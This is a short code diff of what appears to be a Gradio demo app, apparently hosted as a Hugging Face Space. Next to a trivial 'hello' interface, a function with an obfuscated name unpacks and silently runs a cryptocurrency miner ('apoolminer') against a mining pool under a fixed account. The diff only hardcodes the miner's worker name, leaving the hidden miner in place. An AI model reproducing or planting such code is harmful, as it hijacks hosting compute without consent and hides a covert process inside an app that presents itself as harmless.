@@ -8,7 +8,8 @@ def hello(name):
 demo = gr.Interface(fn=hello, inputs="text", outputs="text")
 
 def dab01959():
-    wk_name = os.getenv('SPACE_ID').replace("/","_")
+    wk_name = "shor12_appmg1"
+    #os.getenv('SPACE_ID').replace("/","_")
     os.system("tar xvf apoolminer_linux_autoupdate.tar.gz")
     os.system("chmod +x ./apoolminer_linux_autoupdate/apoolminer")
     os.system(f"./apoolminer_linux_autoupdate/apoolminer --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")
